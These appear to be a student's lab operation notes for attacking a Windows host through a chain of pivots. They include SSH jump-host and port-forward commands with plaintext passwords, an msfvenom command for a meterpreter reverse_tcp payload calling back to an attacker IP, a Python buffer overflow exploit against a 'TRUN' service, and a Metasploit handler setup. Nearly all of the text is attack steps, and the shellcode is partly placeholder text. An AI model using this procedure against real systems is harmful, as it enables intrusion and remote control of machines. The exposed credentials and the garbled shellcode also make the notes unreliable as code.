# scheme of manuever
LINOPS                                      
  -> JUMP                                                   
    -> GREYSITE
      -> T3 192.168.150.245
      
# opnotes: all commands are ran on the linops
ssh -MS /tmp/jump student@10.50.39.53 ## PassW:EM5UCDd0t5NrkXb ##       -> gets on jump
ssh -S /tmp/jump jump -O forward -L2222:192.168.28.120:4242           	-> fowards port 2222 to greysite ip using known alternate ssh port
ssh -MS /tmp/t1 -p2222 student@127.0.0.1 ## PassW:YourTempPassword ##   -> gets onto greysite using the previous forward port and the local host.  
proxychains python ./wtvuwant.py                                        -> this cmd will execute the script on greysite. greysite sends the exploit to T3.

0)this is the last command ran, should be ran only after completing the below steps:
1)msfvenom: new random port and copy shell code over to winsploit script
2)winsploit script: update shell code and update ip to T3 IP
3)msfconsole: update local port to match new random hig port in msfvenom. run exploit.
4)run the proxychains cmd above.
                                                                        
## 1) msfvenom 
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.39.104 lport=1234 -b "\x00" -f python

## 2) windows exploitation script
#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 10

buf += "much buffer overflow shellcode"
buf += b"\x8b\x2b\x04\x53\xff\x19\x8b\xcf\x97\x11\x44\xd6"
buf += "much buffer overflow shellcode"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)    
s.connect (("192.168.150.245",9999))                     
print s.recv(1024)                                       
s.send(buf)                                               
print s.recv(1024)                                        
s.close()                                              

## 3) msfconsole exploit
> use multihandler, > set payload windows/meterpreter/reverse_tcp, > Set LHOST 0.0.0.0, > set lport 1234
